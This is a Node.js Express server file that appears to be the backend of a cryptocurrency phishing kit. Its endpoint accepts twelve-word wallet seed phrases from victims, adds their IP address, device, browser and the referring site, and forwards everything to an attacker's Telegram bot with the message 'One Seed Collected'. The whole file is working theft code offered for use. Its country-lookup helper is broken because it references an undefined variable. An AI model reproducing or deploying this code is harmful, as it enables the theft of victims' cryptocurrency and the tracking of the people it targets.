const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const axios = require('axios');
const UAParser = require('ua-parser-js'); // Parse User-Agent
require('dotenv').config(); // Environment variables

const app = express();
const PORT = 4591;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// Environment variables
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Helper function to get country from IP using ipstack API
const getCountryFromIP = async (ip) => {
  try {
   
    return response.data.country_name || "Unknown Country";
  } catch (error) {
    console.error("Error fetching country information:", error.message);
    return "Unknown Country";
  }
};

// Endpoint to receive form data and forward to Telegram
app.post("/forward", async (req, res) => {
  const { inputs } = req.body;

  if (!inputs || inputs.length !== 12) {
    return res.status(400).json({ success: false, redirect: "/retry" });
  }

  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress; // Capture client IP
  const userAgent = req.headers["user-agent"]; // Capture User-Agent
  const referer = req.headers["referer"] || "Unknown Domain"; // Capture the domain

  // Parse User-Agent
  const parser = new UAParser(userAgent);
  const device = parser.getDevice().model || "Unknown Device";
  const browser = parser.getBrowser().name || "Unknown Browser";
  const os = parser.getOS().name || "Unknown OS";

  // Get country from IP
  const country = await getCountryFromIP(ip);

  // Construct message
  const message = `
📪 One Seed Collected 

🚧 Seed : ${inputs.map((input, index) => `${index + 1}: ${input}`).join("〰️")}

📍 Ip: ${ip}

❗️Country:  ${country}

❗️User-Agent: ${userAgent}

❗️Device: ${device} 

❗️Browser : ${browser}

❗️Operating System: ${os}

🔗 Website: ${referer}`;

  try {
    // Send message to Telegram
    await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      }
    );

    res.status(200).json({ success: true, redirect: "/success" });
  } catch (error) {
    console.error("Error forwarding to Telegram:", error.response?.data || error.message);
    res.status(500).json({ success: false, redirect: "/failure" });
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
